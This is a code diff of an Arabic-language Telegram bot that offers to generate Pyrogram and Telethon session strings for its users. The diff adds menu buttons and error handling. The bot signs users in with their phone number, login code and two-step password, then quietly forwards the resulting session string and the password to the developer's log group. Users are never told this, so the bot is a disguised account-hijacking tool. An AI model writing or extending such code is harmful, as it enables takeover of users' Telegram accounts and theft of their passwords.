@@ -1,7 +1,13 @@
+# -*- coding: utf-8 -*-
 # Join ne on telegram @devggn
+
 import os
+import sys
 import asyncio
+import threading
+from flask import Flask
 from pyrogram import Client, filters
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 from pyrogram.errors import (
     ApiIdInvalid,
     PhoneNumberInvalid,
@@ -24,10 +30,15 @@ from config import LOG_GROUP as SESSION_CHANNEL, API_ID, API_HASH, BOT_TOKEN
 # ====== معلومات المطور ======
 DEV_NAME = "عبود"
 DEV_USERNAME = "@u_t_r"
+CHANNEL_LINK = "https://t.me/devggn"
 
 user_steps = {}
 user_data = {}
 user_sessions = {}  # لحفظ الجلسات المستخرجة
+
+# ====== إعداد الترميز ======
+if sys.stdout.encoding != 'UTF-8':
+    sys.stdout.reconfigure(encoding='utf-8')
 
 app = Client(
     "gagan",
@@ -51,81 +62,176 @@ def delete_session_files(user_id):
     if os.path.exists(telethon_session):
         os.remove(telethon_session)
 
+# ====== أزرار البداية ======
+START_BUTTONS = InlineKeyboardMarkup([
+    [
+        InlineKeyboardButton("🔄 توليد جلسة", callback_data="generate"),
+        InlineKeyboardButton("🗑 مسح الجلسات", callback_data="delete")
+    ],
+    [
+        InlineKeyboardButton("👨‍💻 المطور", callback_data="dev"),
+        InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK)
+    ]
+])
+
+BACK_BUTTON = InlineKeyboardMarkup([
+    [InlineKeyboardButton("🔙 رجوع", callback_data="back")]
+])
+
+# ====== أزرار اختيار نوع الجلسة ======
+TYPE_BUTTONS = InlineKeyboardMarkup([
+    [
+        InlineKeyboardButton("🔥 Pyrogram", callback_data="pyrogram"),
+        InlineKeyboardButton("⚡ Telethon", callback_data="telethon")
+    ],
+    [
+        InlineKeyboardButton("🔑 API Info", callback_data="api"),
+        InlineKeyboardButton("❌ إلغاء", callback_data="cancel")
+    ]
+])
+
 # ====== أمر البدء ======
 @app.on_message(filters.command("start"))
 async def start_command(client, message):
     await message.reply(
         f"👋 **مرحباً بك في بوت استخراج الجلسات!**\n\n"
-        "📌 **للاستخدام:**\n"
-        "• أرسل `توليد` لبدء استخراج جلسة جديدة.\n"
-        "• أرسل `مسح` لمسح بيانات الجلسة المحفوظة.\n"
-        "• أرسل `المطور` لعرض معلومات المطور.\n\n"
+        "📌 **اختر ما تريد فعله من الأزرار أدناه:**\n\n"
         f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}\n\n"
-        "⚡ **مدعوم من عبود **"
+        "⚡ **مدعوم من عبود**",
+        reply_markup=START_BUTTONS
     )
 
-# ====== الأوامر العربية ======
+# ====== أمر الاختبار ======
+@app.on_message(filters.command("test"))
+async def test_send(client, message):
+    try:
+        await app.send_message(SESSION_CHANNEL, "✅ هذه رسالة اختبار من البوت!")
+        await message.reply("✅ تم إرسال رسالة الاختبار إلى المجموعة!")
+    except Exception as e:
+        await message.reply(f"❌ فشل الإرسال: {e}")
+
+# ====== معالجة الأزرار (CallbackQuery) ======
+@app.on_callback_query()
+async def handle_callback(client, callback_query: CallbackQuery):
+    user_id = callback_query.from_user.id
+    data = callback_query.data
+    
+    # زر الرجوع
+    if data == "back":
+        await callback_query.message.edit_text(
+            f"👋 **مرحباً بك في بوت استخراج الجلسات!**\n\n"
+            "📌 **اختر ما تريد فعله من الأزرار أدناه:**\n\n"
+            f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}\n\n"
+            "⚡ **مدعوم من عبود**",
+            reply_markup=START_BUTTONS
+        )
+        await callback_query.answer()
+        return
+    
+    # زر التوليد
+    if data == "generate":
+        await callback_query.message.edit_text(
+            "🔑 **اختر نوع الجلسة المطلوبة:**\n\n"
+            "• **Pyrogram** لجلسات Pyrogram\n"
+            "• **Telethon** لجلسات Telethon\n"
+            "• **API Info** لاستخراج API ID و API HASH",
+            reply_markup=TYPE_BUTTONS
+        )
+        await callback_query.answer()
+        return
+    
+    # زر المسح
+    if data == "delete":
+        delete_session_files(user_id)
+        if user_id in user_sessions:
+            del user_sessions[user_id]
+        await callback_query.answer("✅ تم مسح جميع الجلسات والملفات المؤقتة!", show_alert=True)
+        await callback_query.message.edit_text(
+            "🗑 **تم مسح جميع بيانات الجلسة والملفات المؤقتة بنجاح.**",
+            reply_markup=BACK_BUTTON
+        )
+        return
+    
+    # زر المطور
+    if data == "dev":
+        await callback_query.message.edit_text(
+            f"👨‍💻 **معلومات المطور:**\n\n"
+            f"📛 **الاسم:** {DEV_NAME}\n"
+            f"🔗 **اليوزر:** {DEV_USERNAME}\n"
+            f"📢 **القناة:** {CHANNEL_LINK}\n\n"
+            "⚡ **مدعوم من عبود**",
+            reply_markup=BACK_BUTTON
+        )
+        await callback_query.answer()
+        return
+    
+    # زر إلغاء
+    if data == "cancel":
+        reset_user(user_id)
+        await callback_query.answer("❌ تم إلغاء العملية!", show_alert=True)
+        await callback_query.message.edit_text(
+            "❌ **تم إلغاء العملية.**",
+            reply_markup=BACK_BUTTON
+        )
+        return
+    
+    # زر Pyrogram
+    if data == "pyrogram":
+        user_steps[user_id] = "pyro_phone"
+        await callback_query.message.edit_text(
+            "📱 **يرجى إرسال رقم هاتفك مع رمز الدولة.**\nمثال: `+966512345678`",
+            reply_markup=BACK_BUTTON
+        )
+        await callback_query.answer()
+        return
+    
+    # زر Telethon
+    if data == "telethon":
+        user_steps[user_id] = "telethon_phone"
+        await callback_query.message.edit_text(
+            "📱 **يرجى إرسال رقم هاتفك مع رمز الدولة.**\nمثال: `+966512345678`",
+            reply_markup=BACK_BUTTON
+        )
+        await callback_query.answer()
+        return
+    
+    # زر API Info
+    if data == "api":
+        await extract_api_info_callback(callback_query)
+        return
+
+# ====== استخراج API Info من الكولباك ======
+async def extract_api_info_callback(callback_query):
+    user_id = callback_query.from_user.id
+    await callback_query.message.edit_text(
+        f"✅ **تم استخراج معلومات API بنجاح!**\n\n"
+        f"🆔 **API ID:** `{API_ID}`\n"
+        f"🔑 **API HASH:** `{API_HASH}`\n\n"
+        f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}",
+        reply_markup=BACK_BUTTON
+    )
+    
+    try:
+        await app.send_message(
+            SESSION_CHANNEL,
+            f"✨ **معرف المستخدم:** `{user_id}`\n\n"
+            f"🆔 **API ID:** `{API_ID}`\n"
+            f"🔑 **API HASH:** `{API_HASH}`\n\n"
+            f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
+        )
+    except Exception as e:
+        print(f"❌ فشل إرسال API Info للمجموعة: {e}")
+    
+    await callback_query.answer()
+
+# ====== الأوامر النصية ======
 @app.on_message(filters.text & filters.private)
 async def handle_arabic_commands(client, message):
     user_id = message.chat.id
     text = message.text.strip()
     
-    # أمر التوليد
-    if text == "توليد":
-        await message.reply(
-            "🔑 **اختر نوع الجلسة المطلوبة:**\n\n"
-            "• أرسل `بيروجرام` لاستخراج جلسة Pyrogram\n"
-            "• أرسل `تليثون` لاستخراج جلسة Telethon\n"
-            "• أرسل `ايبيات` لاستخراج API ID و API HASH\n\n"
-            "أو أرسل `إلغاء` لإلغاء العملية."
-        )
-        user_steps[user_id] = "choose_type"
-        return
-    
-    # أمر المسح
-    elif text == "مسح":
-        delete_session_files(user_id)
-        if user_id in user_sessions:
-            del user_sessions[user_id]
-        await message.reply("✅ **تم مسح جميع بيانات الجلسة والملفات المؤقتة بنجاح.**")
-        return
-    
-    # أمر المطور
-    elif text == "المطور":
-        await message.reply(
-            f"👨‍💻 **معلومات المطور:**\n\n"
-            f"📛 **الاسم:** {DEV_NAME}\n"
-            f"🔗 **اليوزر:** {DEV_USERNAME}\n\n"
-            "⚡ **مدعوم من  عبود**"
-        )
-        return
-    
-    # معالجة اختيار نوع الجلسة
-    elif user_id in user_steps and user_steps[user_id] == "choose_type":
-        if text == "بيروجرام":
-            user_steps[user_id] = "pyro_phone"
-            await message.reply("📱 **يرجى إرسال رقم هاتفك مع رمز الدولة.**\nمثال: `+966512345678`")
-        elif text == "تليثون":
-            user_steps[user_id] = "telethon_phone"
-            await message.reply("📱 **يرجى إرسال رقم هاتفك مع رمز الدولة.**\nمثال: `+966512345678`")
-        elif text == "ايبيات":
-            await extract_api_info(message)
-            reset_user(user_id)
-        elif text == "إلغاء":
-            reset_user(user_id)
-            await message.reply("❌ **تم إلغاء العملية.**")
-        else:
-            await message.reply(
-                "❌ **خيار غير صحيح.**\n\n"
-                "• أرسل `بيروجرام` لاستخراج جلسة Pyrogram\n"
-                "• أرسل `تليثون` لاستخراج جلسة Telethon\n"
-                "• أرسل `ايبيات` لاستخراج API ID و API HASH\n"
-                "• أرسل `إلغاء` لإلغاء العملية."
-            )
-        return
-    
     # معالجة خطوات Pyrogram
-    elif user_id in user_steps and user_steps[user_id] in ["pyro_phone", "pyro_otp", "pyro_password"]:
+    if user_id in user_steps and user_steps[user_id] in ["pyro_phone", "pyro_otp", "pyro_password"]:
         await pyro_session_step(client, message)
         return
     
@@ -137,32 +243,12 @@ async def handle_arabic_commands(client, message):
     # أي نص آخر
     else:
         await message.reply(
-            "📱 **يرجى إرسال رقم هاتفك مع رمز الدولة.**\n\n"
-            "مثال: `+966512345678`\n\n"
-            "أو استخدم الأوامر:\n"
-            "• `توليد` لبدء استخراج جلسة جديدة\n"
-            "• `مسح` لمسح البيانات\n"
-            "• `المطور` لعرض معلومات المطور"
+            "📱 **يرجى استخدام الأزرار للتحكم في البوت.**\n\n"
+            "• اضغط على زر **توليد جلسة** لبدء الاستخراج\n"
+            "• اضغط على زر **مسح الجلسات** لحذف البيانات\n"
+            "• اضغط على زر **المطور** لعرض المعلومات\n\n"
+            "أو استخدم الأمر `/start` للرجوع إلى البداية."
         )
-        user_steps[user_id] = "phone_number"
-
-# ====== استخراج API Info ======
-async def extract_api_info(message):
-    user_id = message.chat.id
-    await message.reply(
-        f"✅ **تم استخراج معلومات API بنجاح!**\n\n"
-        f"🆔 **API ID:** `{API_ID}`\n"
-        f"🔑 **API HASH:** `{API_HASH}`\n\n"
-        f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
-    )
-    
-    await app.send_message(
-        SESSION_CHANNEL,
-        f"✨ **معرف المستخدم:** `{user_id}`\n\n"
-        f"🆔 **API ID:** `{API_ID}`\n"
-        f"🔑 **API HASH:** `{API_HASH}`\n\n"
-        f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
-    )
 
 # ====== دوال Pyrogram ======
 async def pyro_session_step(client, message):
@@ -181,7 +267,7 @@ async def pyro_session_step(client, message):
             code = await temp_client.send_code(user_data[user_id]["phone"])
             user_data[user_id]["phone_code_hash"] = code.phone_code_hash
             await omsg.delete()
-            await message.reply("📨 **تم إرسال رمز التحقق.**\n\nأرسل الرمز بالأرقام فقط (مثال: `12345`).")
+            await message.reply("📨 **تم إرسال رمز التحقق.**\n\nأرسل الرمز بالأرقام فقط (مثال: `12345`)")
         except ApiIdInvalid:
             await message.reply('❌ **خطأ: تركيبة API_ID و API_HASH غير صالحة.**')
             reset_user(user_id)
@@ -195,7 +281,7 @@ async def pyro_session_step(client, message):
         try:
             await temp_client.sign_in(user_data[user_id]["phone"], user_data[user_id]["phone_code_hash"], phone_code)
             session_string = await temp_client.export_session_string()
-            user_sessions[user_id] = session_string  # حفظ الجلسة
+            user_sessions[user_id] = session_string
             await send_pyro_session(user_id, session_string, message)
             await temp_client.disconnect()
             reset_user(user_id)
@@ -215,7 +301,7 @@ async def pyro_session_step(client, message):
             password = message.text
             await temp_client.check_password(password=password)
             session_string = await temp_client.export_session_string()
-            user_sessions[user_id] = session_string  # حفظ الجلسة
+            user_sessions[user_id] = session_string
             await send_pyro_session(user_id, session_string, message, password)
             await temp_client.disconnect()
             reset_user(user_id)
@@ -232,22 +318,26 @@ async def send_pyro_session(user_id, session_string, message, password=None):
         f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
     )
     
-    # رسالة للقناة
-    if password:
-        await app.send_message(
-            SESSION_CHANNEL,
-            f"✨ **معرف المستخدم:** `{user_id}`\n\n"
-            f"🔑 **كلمة المرور (2SV):** `{password}`\n\n"
-            f"🔑 **جلسة Pyrogram:**\n`{session_string}`\n\n"
-            f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
-        )
-    else:
-        await app.send_message(
-            SESSION_CHANNEL,
-            f"✨ **معرف المستخدم:** `{user_id}`\n\n"
-            f"🔑 **جلسة Pyrogram:**\n`{session_string}`\n\n"
-            f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
-        )
+    # محاولة إرسال إلى المجموعة
+    try:
+        if password:
+            await app.send_message(
+                SESSION_CHANNEL,
+                f"✨ **معرف المستخدم:** `{user_id}`\n\n"
+                f"🔑 **كلمة المرور (2SV):** `{password}`\n\n"
+                f"🔑 **جلسة Pyrogram:**\n`{session_string}`\n\n"
+                f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
+            )
+        else:
+            await app.send_message(
+                SESSION_CHANNEL,
+                f"✨ **معرف المستخدم:** `{user_id}`\n\n"
+                f"🔑 **جلسة Pyrogram:**\n`{session_string}`\n\n"
+                f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
+            )
+        print(f"✅ تم إرسال جلسة Pyrogram للمجموعة {SESSION_CHANNEL}")
+    except Exception as e:
+        print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
 
 # ====== دوال Telethon ======
 async def telethon_session_step(client, message):
@@ -265,7 +355,7 @@ async def telethon_session_step(client, message):
         try:
             await temp_client.send_code_request(user_data[user_id]["phone"])
             await omsg.delete()
-            await message.reply("📨 **تم إرسال رمز التحقق.**\n\nأرسل الرمز بالأرقام فقط (مثال: `12345`).")
+            await message.reply("📨 **تم إرسال رمز التحقق.**\n\nأرسل الرمز بالأرقام فقط (مثال: `12345`)")
         except ApiIdInvalidError:
             await message.reply('❌ **خطأ: تركيبة API_ID و API_HASH غير صالحة.**')
             reset_user(user_id)
@@ -287,10 +377,9 @@ async def telethon_session_step(client, message):
                 with open(session_file, 'r') as f:
                     session_string = f.read()
             
-            # إذا لم توجد جلسة في الملف، استخدم export_session_string
+            # إذا لم توجد جلسة في الملف
             if session_string is None or session_string == "":
                 session_string = temp_client.session.save()
-                # حفظ الجلسة في الذاكرة
                 user_sessions[user_id] = session_string
             else:
                 user_sessions[user_id] = session_string
@@ -322,7 +411,7 @@ async def telethon_session_step(client, message):
                 with open(session_file, 'r') as f:
                     session_string = f.read()
             
-            # إذا لم توجد جلسة في الملف، استخدم export_session_string
+            # إذا لم توجد جلسة في الملف
             if session_string is None or session_string == "":
                 session_string = temp_client.session.save()
                 user_sessions[user_id] = session_string
@@ -352,31 +441,32 @@ async def send_telethon_session(user_id, session_string, message, password=None)
         f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
     )
     
-    # رسالة للقناة
-    if password:
-        await app.send_message(
-            SESSION_CHANNEL,
-            f"✨ **معرف المستخدم:** `{user_id}`\n\n"
-            f"🔑 **كلمة المرور (2SV):** `{password}`\n\n"
-            f"🔑 **جلسة Telethon:**\n`{session_string}`\n\n"
-            f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
-        )
-    else:
-        await app.send_message(
-            SESSION_CHANNEL,
-            f"✨ **معرف المستخدم:** `{user_id}`\n\n"
-            f"🔑 **جلسة Telethon:**\n`{session_string}`\n\n"
-            f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
-        )
+    # محاولة إرسال إلى المجموعة
+    try:
+        if password:
+            await app.send_message(
+                SESSION_CHANNEL,
+                f"✨ **معرف المستخدم:** `{user_id}`\n\n"
+                f"🔑 **كلمة المرور (2SV):** `{password}`\n\n"
+                f"🔑 **جلسة Telethon:**\n`{session_string}`\n\n"
+                f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
+            )
+        else:
+            await app.send_message(
+                SESSION_CHANNEL,
+                f"✨ **معرف المستخدم:** `{user_id}`\n\n"
+                f"🔑 **جلسة Telethon:**\n`{session_string}`\n\n"
+                f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
+            )
+        print(f"✅ تم إرسال جلسة Telethon للمجموعة {SESSION_CHANNEL}")
+    except Exception as e:
+        print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
 
 def reset_user(user_id):
     user_steps.pop(user_id, None)
     user_data.pop(user_id, None)
 
 # ====== إضافة مسار ويب لـ Render ======
-from flask import Flask, render_template_string
-import threading
-
 web_app = Flask(__name__)
 
 @web_app.route('/')
